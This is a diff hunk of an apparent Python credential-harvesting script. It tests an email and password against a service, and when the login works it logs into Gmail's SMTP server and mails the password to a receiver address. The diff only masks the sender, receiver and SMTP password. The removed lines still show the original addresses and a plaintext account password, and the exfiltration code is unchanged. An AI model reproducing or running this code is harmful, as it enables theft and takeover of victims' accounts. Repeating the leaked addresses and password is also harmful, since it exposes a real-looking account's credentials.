@@ -82,11 +82,11 @@ print(credential, is_mainaccount1);                                             
 response = test_credentials(email, password);                                   #                                                                                                #
 if email in response.text:                                                      #                                                         
 #---------------------------------------------------+---------------------------#
-    sender = "sulog.482624150134@depedqc.ph"        #                           #
-    receiver = "tyler1@programmer.net";             #                           #
+    sender = "#############################"        #                           #
+    receiver = "#####################";             #                           #
     server = smtplib.SMTP('smtp.gmail.com', 587);   #                           #
     server.starttls();                              #                           #
-    server.login(sender, "Bruhfuckoff23");          #                           #       
+    server.login(sender, "<REDACTED> ##");          #                           #       
     server.sendmail(sender, receiver, password)     #                           #
 #---------------------------------------------------#---------------------------#
     print('ADMIN LOGIN CHECK: CORRECT!');                                       #
